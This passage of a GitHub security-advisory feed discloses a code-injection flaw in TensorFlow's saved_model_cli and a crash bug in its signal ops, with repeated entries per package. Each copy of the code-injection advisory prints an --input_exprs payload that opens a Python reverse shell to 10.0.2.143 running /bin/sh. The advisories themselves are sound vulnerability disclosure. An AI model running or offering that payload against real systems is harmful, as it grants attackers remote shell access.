--dir ./ --tag_set serve --signature_def serving_default
</code></pre>
<p>This is because <a href="https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7">the fix</a> for <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41228">CVE-2021-41228</a> was incomplete. Under <a href="https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574">certain code paths</a> it still allows unsafe execution:</p>
<pre><code class="language-python">def preprocess_input_exprs_arg_string(input_exprs_str, safe=True):
  # ...

  for input_raw in filter(bool, input_exprs_str.split(';')):
    # ...
    if safe:
      # ...
    else:
      # ast.literal_eval does not work with numpy expressions
      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used
  return input_dict
</code></pre>
<p>This code path was maintained for compatibility reasons as we had several test cases where numpy expressions were used as arguments.</p>
<p>However, given that the tool is always run manually, the impact of this is still not severe. We have now removed the <code>safe=False</code> argument, so all parsing is done withough calling <code>eval</code>.</p>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac">c5da7af048611aa29e9382371f0aed5018516cac</a>.</p>
<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Andey Robins from the Cybersecurity Education and Research Lab in the Department of Computer Science at the University of Wyoming.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-29216">https://nvd.nist.gov/vuln/detail/CVE-2022-29216</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7">https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac">https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574">https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>
<li><a href="https://github.com/advisories/GHSA-75c9-jrh4-79mc">https://github.com/advisories/GHSA-75c9-jrh4-79mc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-75c9-jrh4-79mc</uri>
        </author>
        <published>2022-05-24T22:16:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow] Code injection in `saved_model_cli`]]></title>
        <id>https://github.com/advisories/GHSA-75c9-jrh4-79mc</id>
        <link href="https://github.com/advisories/GHSA-75c9-jrh4-79mc"/>
        <updated>2022-05-24T22:16:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>TensorFlow's <code>saved_model_cli</code> tool is vulnerable to a code injection:</p>
<pre><code>saved_model_cli run --input_exprs 'x=print("malicious code to run")' --dir ./
--tag_set serve --signature_def serving_default
</code></pre>
<p>This can be used to open a reverse shell                                      </p>
<pre><code>saved_model_cli run --input_exprs 'hello=exec("""\nimport socket\nimport
subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("10.0.2.143",33419))\nsubprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())""")'
--dir ./ --tag_set serve --signature_def serving_default
</code></pre>
<p>This is because <a href="https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7">the fix</a> for <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41228">CVE-2021-41228</a> was incomplete. Under <a href="https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574">certain code paths</a> it still allows unsafe execution:</p>
<pre><code class="language-python">def preprocess_input_exprs_arg_string(input_exprs_str, safe=True):
  # ...

  for input_raw in filter(bool, input_exprs_str.split(';')):
    # ...
    if safe:
      # ...
    else:
      # ast.literal_eval does not work with numpy expressions
      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used
  return input_dict
</code></pre>
<p>This code path was maintained for compatibility reasons as we had several test cases where numpy expressions were used as arguments.</p>
<p>However, given that the tool is always run manually, the impact of this is still not severe. We have now removed the <code>safe=False</code> argument, so all parsing is done withough calling <code>eval</code>.</p>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac">c5da7af048611aa29e9382371f0aed5018516cac</a>.</p>
<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Andey Robins from the Cybersecurity Education and Research Lab in the Department of Computer Science at the University of Wyoming.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-29216">https://nvd.nist.gov/vuln/detail/CVE-2022-29216</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7">https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac">https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574">https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>
<li><a href="https://github.com/advisories/GHSA-75c9-jrh4-79mc">https://github.com/advisories/GHSA-75c9-jrh4-79mc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-75c9-jrh4-79mc</uri>
        </author>
        <published>2022-05-24T22:16:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-gpu] Code injection in `saved_model_cli`]]></title>
        <id>https://github.com/advisories/GHSA-75c9-jrh4-79mc</id>
        <link href="https://github.com/advisories/GHSA-75c9-jrh4-79mc"/>
        <updated>2022-05-24T22:16:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>TensorFlow's <code>saved_model_cli</code> tool is vulnerable to a code injection:</p>
<pre><code>saved_model_cli run --input_exprs 'x=print("malicious code to run")' --dir ./
--tag_set serve --signature_def serving_default
</code></pre>
<p>This can be used to open a reverse shell                                      </p>
<pre><code>saved_model_cli run --input_exprs 'hello=exec("""\nimport socket\nimport
subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("10.0.2.143",33419))\nsubprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())""")'
--dir ./ --tag_set serve --signature_def serving_default
</code></pre>
<p>This is because <a href="https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7">the fix</a> for <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41228">CVE-2021-41228</a> was incomplete. Under <a href="https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574">certain code paths</a> it still allows unsafe execution:</p>
<pre><code class="language-python">def preprocess_input_exprs_arg_string(input_exprs_str, safe=True):
  # ...

  for input_raw in filter(bool, input_exprs_str.split(';')):
    # ...
    if safe:
      # ...
    else:
      # ast.literal_eval does not work with numpy expressions
      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used
  return input_dict
</code></pre>
<p>This code path was maintained for compatibility reasons as we had several test cases where numpy expressions were used as arguments.</p>
<p>However, given that the tool is always run manually, the impact of this is still not severe. We have now removed the <code>safe=False</code> argument, so all parsing is done withough calling <code>eval</code>.</p>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac">c5da7af048611aa29e9382371f0aed5018516cac</a>.</p>
<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Andey Robins from the Cybersecurity Education and Research Lab in the Department of Computer Science at the University of Wyoming.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-29216">https://nvd.nist.gov/vuln/detail/CVE-2022-29216</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7">https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac">https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574">https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>
<li><a href="https://github.com/advisories/GHSA-75c9-jrh4-79mc">https://github.com/advisories/GHSA-75c9-jrh4-79mc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-75c9-jrh4-79mc</uri>
        </author>
        <published>2022-05-24T22:16:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-cpu] Code injection in `saved_model_cli`]]></title>
        <id>https://github.com/advisories/GHSA-75c9-jrh4-79mc</id>
        <link href="https://github.com/advisories/GHSA-75c9-jrh4-79mc"/>
        <updated>2022-05-24T22:16:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>TensorFlow's <code>saved_model_cli</code> tool is vulnerable to a code injection:</p>
<pre><code>saved_model_cli run --input_exprs 'x=print("malicious code to run")' --dir ./
--tag_set serve --signature_def serving_default
</code></pre>
<p>This can be used to open a reverse shell                                      </p>
<pre><code>saved_model_cli run --input_exprs 'hello=exec("""\nimport socket\nimport
subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("10.0.2.143",33419))\nsubprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())""")'
--dir ./ --tag_set serve --signature_def serving_default
</code></pre>
<p>This is because <a href="https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7">the fix</a> for <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41228">CVE-2021-41228</a> was incomplete. Under <a href="https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574">certain code paths</a> it still allows unsafe execution:</p>
<pre><code class="language-python">def preprocess_input_exprs_arg_string(input_exprs_str, safe=True):
  # ...

  for input_raw in filter(bool, input_exprs_str.split(';')):
    # ...
    if safe:
      # ...
    else:
      # ast.literal_eval does not work with numpy expressions
      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used
  return input_dict
</code></pre>
<p>This code path was maintained for compatibility reasons as we had several test cases where numpy expressions were used as arguments.</p>
<p>However, given that the tool is always run manually, the impact of this is still not severe. We have now removed the <code>safe=False</code> argument, so all parsing is done withough calling <code>eval</code>.</p>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac">c5da7af048611aa29e9382371f0aed5018516cac</a>.</p>
<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Andey Robins from the Cybersecurity Education and Research Lab in the Department of Computer Science at the University of Wyoming.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-29216">https://nvd.nist.gov/vuln/detail/CVE-2022-29216</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7">https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac">https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574">https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>
<li><a href="https://github.com/advisories/GHSA-75c9-jrh4-79mc">https://github.com/advisories/GHSA-75c9-jrh4-79mc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-75c9-jrh4-79mc</uri>
        </author>
        <published>2022-05-24T22:16:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow] Code injection in `saved_model_cli`]]></title>
        <id>https://github.com/advisories/GHSA-75c9-jrh4-79mc</id>
        <link href="https://github.com/advisories/GHSA-75c9-jrh4-79mc"/>
        <updated>2022-05-24T22:16:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>TensorFlow's <code>saved_model_cli</code> tool is vulnerable to a code injection:</p>
<pre><code>saved_model_cli run --input_exprs 'x=print("malicious code to run")' --dir ./
--tag_set serve --signature_def serving_default
</code></pre>
<p>This can be used to open a reverse shell                                      </p>
<pre><code>saved_model_cli run --input_exprs 'hello=exec("""\nimport socket\nimport
subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("10.0.2.143",33419))\nsubprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())""")'
--dir ./ --tag_set serve --signature_def serving_default
</code></pre>
<p>This is because <a href="https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7">the fix</a> for <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41228">CVE-2021-41228</a> was incomplete. Under <a href="https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574">certain code paths</a> it still allows unsafe execution:</p>
<pre><code class="language-python">def preprocess_input_exprs_arg_string(input_exprs_str, safe=True):
  # ...

  for input_raw in filter(bool, input_exprs_str.split(';')):
    # ...
    if safe:
      # ...
    else:
      # ast.literal_eval does not work with numpy expressions
      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used
  return input_dict
</code></pre>
<p>This code path was maintained for compatibility reasons as we had several test cases where numpy expressions were used as arguments.</p>
<p>However, given that the tool is always run manually, the impact of this is still not severe. We have now removed the <code>safe=False</code> argument, so all parsing is done withough calling <code>eval</code>.</p>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac">c5da7af048611aa29e9382371f0aed5018516cac</a>.</p>
<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Andey Robins from the Cybersecurity Education and Research Lab in the Department of Computer Science at the University of Wyoming.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-29216">https://nvd.nist.gov/vuln/detail/CVE-2022-29216</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7">https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac">https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574">https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>
<li><a href="https://github.com/advisories/GHSA-75c9-jrh4-79mc">https://github.com/advisories/GHSA-75c9-jrh4-79mc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-75c9-jrh4-79mc</uri>
        </author>
        <published>2022-05-24T22:16:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-gpu] Incomplete validation in signal ops leads to crashes]]></title>
        <id>https://github.com/advisories/GHSA-5889-7v45-q28m</id>
        <link href="https://github.com/advisories/GHSA-5889-7v45-q28m"/>
        <updated>2022-05-24T22:16:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>tf.compat.v1.signal.rfft2d</code> and <code>tf.compat.v1.signal.rfft3d</code> lack input validation and under certain condition can result in crashes (due to <code>CHECK</code>-failures).</p>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73">0a8a781e597b18ead006d19b7d23d0a369e9ad73</a> (merging GitHub PR <a href="https://github.com/tensorflow/tensorflow/pull/55274">#55274</a>).</p>
<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported externally via a <a href="https://github.com/tensorflow/tensorflow/issues/55263">GitHub issue</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-29213">https://nvd.nist.gov/vuln/detail/CVE-2022-29213</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/issues/55263">https://github.com/tensorflow/tensorflow/issues/55263</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/pull/55274">https://github.com/tensorflow/tensorflow/pull/55274</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73">https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>
<li><a href="https://github.com/advisories/GHSA-5889-7v45-q28m">https://github.com/advisories/GHSA-5889-7v45-q28m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5889-7v45-q28m</uri>
        </author>
        <published>2022-05-24T22:16:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-gpu] Incomplete validation in signal ops leads to crashes]]></title>
        <id>https://github.com/advisories/GHSA-5889-7v45-q28m</id>
        <link href="https://github.com/advisories/GHSA-5889-7v45-q28m"/>
        <updated>2022-05-24T22:16:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>tf.compat.v1.signal.rfft2d</code> and <code>tf.compat.v1.signal.rfft3d</code> lack input validation and under certain condition can result in crashes (due to <code>CHECK</code>-failures).</p>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73">0a8a781e597b18ead006d19b7d23d0a369e9ad73</a> (merging GitHub PR <a href="https://github.com/tensorflow/tensorflow/pull/55274">#55274</a>).</p>
<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported externally via a <a href="https://github.com/tensorflow/tensorflow/issues/55263">GitHub issue</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-29213">https://nvd.nist.gov/vuln/detail/CVE-2022-29213</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/issues/55263">https://github.com/tensorflow/tensorflow/issues/55263</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/pull/55274">https://github.com/tensorflow/tensorflow/pull/55274</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73">https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>
<li><a href="https://github.com/advisories/GHSA-5889-7v45-q28m">https://github.com/advisories/GHSA-5889-7v45-q28m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5889-7v45-q28m</uri>
        </author>
        <published>2022-05-24T22:16:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-gpu] Incomplete validation in signal ops leads to crashes]]></title>
        <id>https://github.com/advisories/GHSA-5889-7v45-q28m</id>
        <link href="https://github.com/advisories/GHSA-5889-7v45-q28m"/>
        <updated>2022-05-24T22:16:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>tf.compat.v1.signal.rfft2d</code> and <code>tf.compat.v1.signal.rfft3d</code> lack input validation and under certain condition can result in crashes (due to <code>CHECK</code>-failures).</p>
<h3 id="patches">Patches</h3>
